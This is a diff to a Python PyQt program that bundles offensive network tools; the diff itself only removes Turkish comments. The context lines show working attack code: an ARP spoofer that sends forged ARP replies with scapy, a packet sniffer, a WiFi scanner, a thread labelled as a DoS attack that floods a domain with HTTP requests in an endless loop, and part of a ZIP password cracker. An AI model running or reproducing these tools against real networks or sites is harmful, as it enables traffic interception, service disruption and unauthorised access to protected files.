@@ -79,7 +79,7 @@ class ArpSpooferWindow(QWidget):
     def __init__(self, instance_num):
         super().__init__()
         self.setWindowTitle(f"ARP Spoofer {instance_num}")
-        self.setGeometry(150 + (instance_num - 1) * 420, 150, 400, 200)  # Yan yana açılacak şekilde konumlandırma
+        self.setGeometry(150 + (instance_num - 1) * 420, 150, 400, 200)
 
         self.instance_num = instance_num
         layout = QVBoxLayout()
@@ -113,7 +113,6 @@ class ArpSpooferWindow(QWidget):
             return
 
         try:
-            # Farklı işlem yapma
             arp_request = scapy.ARP(op=2, pdst=target_ip, psrc=spoof_ip)
             scapy.send(arp_request, verbose=False)
             if self.instance_num == 1:
@@ -210,7 +209,6 @@ class PacketSnifferWindow(QWidget):
 
         self.output.append(f"Dinleniyor: {protocol} protokolü...")
 
-        # Gerçek dinleme işlemi
         def packet_callback(packet):
             self.output.append(f"Packet: {packet.summary()}")
 
@@ -240,7 +238,7 @@ class WifiScannerWindow(QWidget):
 
         try:
             wifi = pywifi.PyWiFi()
-            iface = wifi.interfaces()[0]  # İlk ağ arayüzü seçilir
+            iface = wifi.interfaces()[0]
             iface.scan()
             scan_results = iface.scan_results()
 
@@ -302,12 +300,10 @@ class WhoisDosWindow(QWidget):
 
         self.output.append(f"DOS saldırısı başlatılıyor: {domain}...")
         
-        # Arka planda çalışacak olan thread
         self.dos_thread = threading.Thread(target=self.dos_attack, args=(domain,))
         self.dos_thread.start()
 
     def dos_attack(self, domain):
-        # Sonsuz bir döngüde sürekli olarak HTTP isteği gönderelim
         while True:
             try:
                 response = requests.get(f"http://{domain}", timeout=5)
@@ -438,8 +434,6 @@ class ZipPasswordCrackerWindow(QWidget):
                 except RuntimeError:
                     continue
         return None
-
-
 
 if __name__ == "__main__":
     app = QApplication(sys.argv)
